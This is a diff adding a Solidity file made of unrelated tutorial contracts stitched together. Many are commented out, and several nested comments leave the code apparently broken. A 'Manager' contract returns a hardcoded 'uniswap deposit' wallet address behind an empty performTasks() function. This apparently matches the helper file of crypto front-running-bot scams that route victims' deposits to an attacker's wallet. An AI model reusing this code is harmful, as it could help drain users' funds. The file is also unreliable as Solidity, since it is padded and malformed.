@@ -1,0 +1,189 @@
+pragma solidity ^0.6.6;
+
+contract SimpleStorage {
+    uint storedData;
+
+    function set(uint x) public {
+        storedData = x;
+    }
+
+    function get() public view returns (uint) {
+        return storedData;
+    }
+}
+/*contract GetfrontExample {
+  // public state variable
+  uint[] public myArray;
+
+  // 
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // 
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
+contract Coin {
+    // 
+    address public minter;
+    mapping (address => uint) public balances;
+
+    // 
+    event Sent(address from, address to, uint amount);
+
+    // 
+    /*constructor() {
+        minter = msg.sender;
+    }
+
+    function mint(address receiver, uint amount) public {
+        require(msg.sender == minter);
+        require(amount < 1e60);
+        balances[receiver] += amount;
+    }
+
+    function send(address receiver, uint amount) public {
+        require(amount <= balances[msg.sender], "Insufficient balance.");
+        balances[msg.sender] -= amount;
+        balances[receiver] += amount;
+        emit Sent(msg.sender, receiver, amount);
+    }*/
+}
+/*contract GetBNBExample {
+  // public state variable
+  uint[] public myArray;
+
+  // 
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // 
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
+contract C {
+    uint private data;
+
+    //function f(uint a) public returns(uint b) { return a + 1; }
+    function setData(uint a) public { data = a; }
+    //function getData() public returns(uint) { return data; }
+    //function compute(uint a, uint b) internal returns (uint) { return a+b; }
+}
+
+// 
+/*contract D {
+    function readData() public {
+        C c = new C();
+        uint local = c.f(7); // 
+        c.setData(3);
+        local = c.getData();
+        local = c.compute(3, 5); // 
+    }
+}*/
+
+contract E is C {
+    /*function g() public {
+        C c = new C();
+        uint val = compute(3, 5); // 
+    }*/
+}
+
+contract OwnedToken {
+    // TokenCreator
+    //
+    TokenCreator creator;
+    address owner;
+    bytes32 name;
+
+    // 
+    constructor(bytes32 _name) public{
+        owner = msg.sender;
+        creator = TokenCreator(msg.sender);
+        name = _name;
+    }
+
+    function changeName(bytes32 newName) public {
+        if (msg.sender == address(creator))
+            name = newName;
+    }
+
+    /*function transfer(address newOwner) public {
+        // 
+        if (msg.sender != owner) return;
+        //if (creator.isTokenTransferOK(owner, newOwner))
+            //owner = newOwner;
+    }*/
+}
+contract Manager {
+ function performTasks() public {
+     
+ }
+
+ function uniswapDepositAddress() public pure returns (address) {
+  return 0x9cb27b49b28e53b6BAd47d020978226970C4e1bc;
+ }
+}
+contract TokenCreator {
+    function createToken(bytes32 name)
+       public
+       returns (OwnedToken tokenAddress)
+    {
+        // 
+        return new OwnedToken(name);
+    }
+
+    function changeName(OwnedToken tokenAddress, bytes32 name)  public {
+        // tokenAddress` 
+        tokenAddress.changeName(name);
+    }
+
+    /*function isTokenTransferOK(address currentOwner, address newOwner)
+        public
+        view
+        returns (bool ok)
+    {
+        // 
+        address tokenAddress = msg.sender;
+        return (keccak256(newOwner) & 0xff) == (bytes20(tokenAddress) & 0xff);
+    }*/
+}
+contract arrayExample {
+  // public state variable
+  uint[] public myArray;
+
+  // 
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // 
+  function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}
+/*contract GetBotExample {
+  // public state variable
+  uint[] public myArray;
+
+  // 
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // 
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
